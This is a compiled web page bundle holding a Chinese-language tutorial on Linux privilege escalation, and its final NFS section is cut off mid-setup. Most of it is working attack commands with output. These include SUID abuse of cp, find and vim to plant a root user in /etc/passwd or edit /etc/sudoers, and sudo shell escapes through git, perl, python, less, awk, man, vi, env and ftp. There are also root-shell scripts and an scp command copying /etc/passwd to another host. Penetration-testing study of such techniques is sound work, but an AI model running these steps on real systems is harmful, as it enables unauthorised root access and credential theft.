import{_ as i,W as l,X as o,Y as n,Z as s,a0 as e,a1 as t,C as p}from"./framework-b6a07282.js";const c="/assets/1-35567951.jpg",u="/assets/2-b53b5df3.jpg",r={},d=t('<h2 id="linux提权" tabindex="-1"><a class="header-anchor" href="#linux提权" aria-hidden="true">#</a> Linux提权</h2><h3 id="建议" tabindex="-1"><a class="header-anchor" href="#建议" aria-hidden="true">#</a> 建议</h3><p>先找非漏洞提权，因为漏洞提权可能会将服务器弄蓝屏等故障，会非常麻烦。</p><h3 id="漏洞提权" tabindex="-1"><a class="header-anchor" href="#漏洞提权" aria-hidden="true">#</a> 漏洞提权</h3><h4 id="linux漏洞提权检测脚本" tabindex="-1"><a class="header-anchor" href="#linux漏洞提权检测脚本" aria-hidden="true">#</a> Linux漏洞提权检测脚本</h4><ul><li>获取内核版本后，可以搜索该版本存在哪些漏洞可以用来进行提权</li><li>例如常用的检测脚本：</li></ul>',6),v={href:"https://github.com/jondonas/linux-exploit-suggester-2",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/SecWiki/linux-kernel-exploits",target:"_blank",rel:"noopener noreferrer"},b=n("p",null,"但在一些最新提权漏洞上，更新可能并不是很快，例如CVE2020等提权漏洞。如果碰到目标机内核比较新，可能就需要自己去手动搜索相关问题，谷歌相关的关键字，或者找一些在线网站搜索，例如：",-1),k={href:"https://cxsecurity.com/",target:"_blank",rel:"noopener noreferrer"},h=n("h3",{id:"非漏洞提权",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#非漏洞提权","aria-hidden":"true"},"#"),s(" 非漏洞提权")],-1),g=n("h4",{id:"linux非漏洞提权检测脚本",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#linux非漏洞提权检测脚本","aria-hidden":"true"},"#"),s(" Linux非漏洞提权检测脚本")],-1),f=n("ul",null,[n("li",null,"针对非漏洞的相关提权方法，以及搜集Linux上相关的敏感信息，这里可以参考一些脚本，例如：")],-1),_={href:"https://github.com/rebootuser/LinEnum",target:"_blank",rel:"noopener noreferrer"},x={href:"https://github.com/AlessandroZ/BeRoot",target:"_blank",rel:"noopener noreferrer"},L={href:"https://github.com/diego-treitos/linux-smart-enumeration",target:"_blank",rel:"noopener noreferrer"},A=t(`<h4 id="suid提权" tabindex="-1"><a class="header-anchor" href="#suid提权" aria-hidden="true">#</a> SUID提权</h4><ol><li>SUID只能设置二进制文件。</li><li>命令执行者要有二进制文件的执行权。</li><li>命令执行者执行二进制文件时会获得该程序的属主身份。</li><li>SUID权限只在程序执行过程中有效。</li></ol><ul><li><p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p></li><li><p>拥有SUID权限的程序中权限中有s。</p></li></ul><p>可通过<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查找拥有SUID权限的程序</p><p>perm执行权限，-u=s代表SUID权限，type指定文件类型，f表示常规文件。</p><h5 id="cp" tabindex="-1"><a class="header-anchor" href="#cp" aria-hidden="true">#</a> cp</h5><ul><li>cp命令被赋予了SUID权限后就存在提权的可能</li><li>普通用户通过复制/etc/passwd文件，写入一个root权限用户最后覆盖/etc/passwd文件实现提权。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景：
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># which cp</span>
/usr/bin/cp
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># chmod +s /usr/bin/cp</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/cp</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">155176</span> <span class="token number">8</span>月  <span class="token number">20</span> <span class="token number">2019</span> /usr/bin/cp


提权过程：
<span class="token number">1</span>.利用cp的suid功能将/etc/passwd文件复制一份
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cp</span> /etc/passwd ./

<span class="token number">2</span>.使用opensll生成用户密码为123456，用户名自己随意定
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> yanzhi <span class="token number">123456</span>
<span class="token variable">$1</span><span class="token variable">$yanzhi</span><span class="token variable">$Xir02oBlx9g2APCmUZkJa</span>/

<span class="token number">3</span>.仿照/etc/passwd文件root那一行写入一个新用户，并wq<span class="token operator">!</span>。
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">vim</span> <span class="token function">passwd</span>

newuser:<span class="token variable">$1</span><span class="token variable">$yanzhi</span><span class="token variable">$Xir02oBlx9g2APCmUZkJa</span>/:0:0:root:/root:/bin/bash
<span class="token number">4</span>.覆盖掉/etc/passwd文件
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cp</span> ./passwd /etc/passwd

<span class="token number">5</span>.切换newuser，实现提权。
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">su</span> newuser
密码：
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="find" tabindex="-1"><a class="header-anchor" href="#find" aria-hidden="true">#</a> find</h5><ul><li>find命令被赋予了SUID权限后就存在提权的可能</li><li>由于find命令后面可以使用-exec命令来执行其他任意命令，所以可以实现提权。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景：
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># which find</span>
/usr/bin/find
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># chmod +s /usr/bin/find</span>
<span class="token punctuation">[</span>root@localhost hzy<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/find</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">199304</span> <span class="token number">10</span>月 <span class="token number">31</span> <span class="token number">2018</span> /usr/bin/find

提权过程：
<span class="token number">1</span>.简单测试
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">touch</span> <span class="token number">123</span>.txt
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">find</span> <span class="token number">123</span>.txt <span class="token parameter variable">-exec</span> <span class="token string">&quot;whoami&quot;</span> <span class="token punctuation">\\</span><span class="token punctuation">;</span>
root
<span class="token number">2</span>.利用find调出一个bash
<span class="token punctuation">[</span>hzy@localhost ~<span class="token punctuation">]</span>$ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/bash <span class="token parameter variable">-p</span> <span class="token punctuation">\\</span><span class="token punctuation">;</span>
bash-4.2<span class="token comment"># whoami</span>
root
或：
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># find . -exec /bin/sh -p \\;</span>
sh-4.2<span class="token comment"># whoami</span>
root
sh-4.2<span class="token comment"># python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; #升级成交互式shell</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="vim" tabindex="-1"><a class="header-anchor" href="#vim" aria-hidden="true">#</a> vim</h5><ul><li>vim命令被赋予了SUID权限后就存在提权的可能</li><li>当vim被赋予了SUID权限后，任何用户都可以编辑哪些只能由root编辑的文件了。 <ul><li>1.可以通过/etc/sudoers这个文件，控制用户可以通过sudo命令以root权限执行哪些命令。</li><li>2.也可以修改/etc/passwd文件，写入一个root权限的用户。</li></ul></li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景：
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># which vim</span>
/usr/bin/vim
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/vim</span>
-rwxr-xr-x. <span class="token number">1</span> root root <span class="token number">2337216</span> <span class="token number">10</span>月 <span class="token number">14</span> <span class="token number">2020</span> /usr/bin/vim
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># chmod +s /usr/bin/vim</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -al /usr/bin/vim</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">2337216</span> <span class="token number">10</span>月 <span class="token number">14</span> <span class="token number">2020</span> /usr/bin/vim

提权过程：
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> <span class="token builtin class-name">test</span> 的密码：
对不起，用户 <span class="token builtin class-name">test</span> 不能在 localhost 上运行 sudo。

<span class="token number">1</span>.在/etc/sudoers文件中写入test <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL，然后wq<span class="token operator">!</span>保存。
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">vim</span> /etc/sudoers
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> <span class="token builtin class-name">test</span> 的密码：
匹配 %2<span class="token variable">$s</span> 上 %1<span class="token variable">$s</span> 的默认条目：
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\\</span>:/bin<span class="token punctuation">\\</span>:/usr/sbin<span class="token punctuation">\\</span>:/usr/bin

用户 <span class="token builtin class-name">test</span> 可以在 localhost 上运行以下命令：
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sudo提权" tabindex="-1"><a class="header-anchor" href="#sudo提权" aria-hidden="true">#</a> sudo提权</h4><ul><li><p>sudo：以root权限去运行一个命令</p></li><li><p>/etc/sudoers文件：是sudo权限的配置文件，可配置用户来决定是否可以运行相关命令。可以使用命令visudo或者vim /etc/sudoers来编辑它。</p></li></ul><img src="`+c+`"><h5 id="git" tabindex="-1"><a class="header-anchor" href="#git" aria-hidden="true">#</a> git</h5><ul><li>如果在/etc/sudoers文件中，用户允许使用sudo命令来执行git命令，则存在提权的可能</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景
/etc/sudoers文件
<span class="token builtin class-name">test</span>    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>       /usr/bin/git
查看sudo权限
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
匹配 %2<span class="token variable">$s</span> 上 %1<span class="token variable">$s</span> 的默认条目：
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\\</span>:/bin<span class="token punctuation">\\</span>:/usr/sbin<span class="token punctuation">\\</span>:/usr/bin

用户 <span class="token builtin class-name">test</span> 可以在 localhost 上运行以下命令：
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> /usr/bin/git
提权过程
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config
<span class="token number">2</span>.在帮助界面直接输入
<span class="token operator">!</span>/bin/bash
<span class="token number">3</span>.提权成功：
<span class="token punctuation">[</span>root@localhost man<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

或：

<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">git</span> <span class="token parameter variable">-p</span> <span class="token builtin class-name">help</span>
<span class="token number">2</span>.在帮助界面直接输入
<span class="token operator">!</span>/bin/bash
<span class="token number">3</span>.提权成功
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="find-1" tabindex="-1"><a class="header-anchor" href="#find-1" aria-hidden="true">#</a> find</h5><ul><li>利用-exec参数来打开一个bash。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景
<span class="token builtin class-name">test</span>    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>	/usr/bin/git,/usr/bin/perl,/usr/bin/python,/usr/bin/less,/usr/bin/awk,/usr/bin/vi,/usr/bin/find,/usr/bin/man,/bin/env
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> <span class="token builtin class-name">test</span> 的密码：
匹配 %2<span class="token variable">$s</span> 上 %1<span class="token variable">$s</span> 的默认条目：
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\\</span>:/bin<span class="token punctuation">\\</span>:/usr/sbin<span class="token punctuation">\\</span>:/usr/bin

用户 <span class="token builtin class-name">test</span> 可以在 localhost 上运行以下命令：
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> /usr/bin/git, /usr/bin/perl, /usr/bin/python, /usr/bin/less,
        /usr/bin/awk, /usr/bin/vi, /usr/bin/find, /usr/bin/man, /bin/env

提权过程
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">find</span> / <span class="token parameter variable">-exec</span> <span class="token string">&quot;/bin/bash&quot;</span> <span class="token punctuation">\\</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="perl" tabindex="-1"><a class="header-anchor" href="#perl" aria-hidden="true">#</a> perl</h5><ul><li>使用-e参数来指定要运行一个命令，然后利用exec参数来打开一个bash</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> perl <span class="token parameter variable">-e</span> <span class="token string">&#39;exec &quot;/bin/bash&quot;;&#39;</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> python</h5><ul><li>-c参数可以在命令行执行python代码，pty库是一个伪终端库，它的spawn会调用指定的程序。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> python <span class="token parameter variable">-c</span> <span class="token string">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="less" tabindex="-1"><a class="header-anchor" href="#less" aria-hidden="true">#</a> less</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token number">1</span>.使用sudo less浏览文件内容
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token number">123456</span> <span class="token operator">&gt;</span> <span class="token number">123</span>.txt
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">ls</span>
<span class="token number">123</span>.txt
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">less</span> <span class="token number">123</span>.txt
<span class="token number">2</span>.在浏览文件内容时，可通过输入<span class="token operator">!</span>bash后回车，会获得一个root权限的shell
<span class="token operator">!</span>bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="awk" tabindex="-1"><a class="header-anchor" href="#awk" aria-hidden="true">#</a> awk</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token number">1</span>.<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">awk</span> <span class="token string">&#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</span>
sh-4.2<span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="man" tabindex="-1"><a class="header-anchor" href="#man" aria-hidden="true">#</a> man</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token number">1</span>.随意浏览一个命令手册
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">man</span>
您需要什么手册页？
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">man</span> <span class="token function">vim</span>
<span class="token number">2</span>.直接输入<span class="token operator">!</span>bash
<span class="token operator">!</span>bash
<span class="token punctuation">[</span>root@localhost zh_CN<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="vi" tabindex="-1"><a class="header-anchor" href="#vi" aria-hidden="true">#</a> vi</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token number">1</span>.进入vi的默认页
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">vi</span>
<span class="token number">2</span>.输入:<span class="token operator">!</span>bash
:<span class="token operator">!</span>bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="如果存在运维脚本" tabindex="-1"><a class="header-anchor" href="#如果存在运维脚本" aria-hidden="true">#</a> 如果存在运维脚本</h5><ul><li>可通过加入恶意代码打开一个root权限权限的bash</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>.sh文件
<span class="token comment">#! /bin/bash</span>
/bin/bash

.py文件
<span class="token comment">#! /usr/bin/python</span>
<span class="token function">import</span> os
os.system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span>

.c文件
<span class="token comment">#include&lt;stdio.h&gt;</span>
<span class="token comment">#include&lt;unistd.h&gt;</span>
<span class="token comment">#include&lt;sys/types.h&gt;</span>

int <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	setuid<span class="token punctuation">(</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
	system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="env" tabindex="-1"><a class="header-anchor" href="#env" aria-hidden="true">#</a> env</h5><ul><li>通过env环境变量来获取root权限</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">env</span> /bin/bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="ftp" tabindex="-1"><a class="header-anchor" href="#ftp" aria-hidden="true">#</a> ftp</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">ftp</span>
ftp<span class="token operator">&gt;</span> <span class="token operator">!</span>/bin/bash
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="scp" tabindex="-1"><a class="header-anchor" href="#scp" aria-hidden="true">#</a> scp</h5><ul><li>scp是一个安全复制文件命令，它无法获取一个shell，但可以复制一些敏感文件如/etc/passwd，/etc/shadow等，可以将这些文件复制到本地来进行暴力破解。</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#将/etc/passwd文件复制到192.168.1.1主机的/root目录下
sudo scp /etc/passwd root@192.168.1.1:/root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="黑名单情况" tabindex="-1"><a class="header-anchor" href="#黑名单情况" aria-hidden="true">#</a> 黑名单情况</h5><ul><li>如果/etc/sudoers文件禁用了命令，如find，但自身的sudo权限是all。那么可以将find复制到另外的路径，然后再执行。</li></ul><h4 id="nfs配置不当提权" tabindex="-1"><a class="header-anchor" href="#nfs配置不当提权" aria-hidden="true">#</a> NFS配置不当提权</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建：
<span class="token number">1</span>.yum <span class="token function">install</span> <span class="token parameter variable">-y</span> nfs-utils rpcbind
<span class="token number">2</span>.vim /etc/exports
/shagou *<span class="token punctuation">(</span>rw,no_root_squash<span class="token punctuation">)</span>
<span class="token comment"># /shagou是要挂载的目录，*代表允许连接的主机，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</span>
<span class="token number">4</span>.启动服务、
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># export</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl stop firewalld</span>
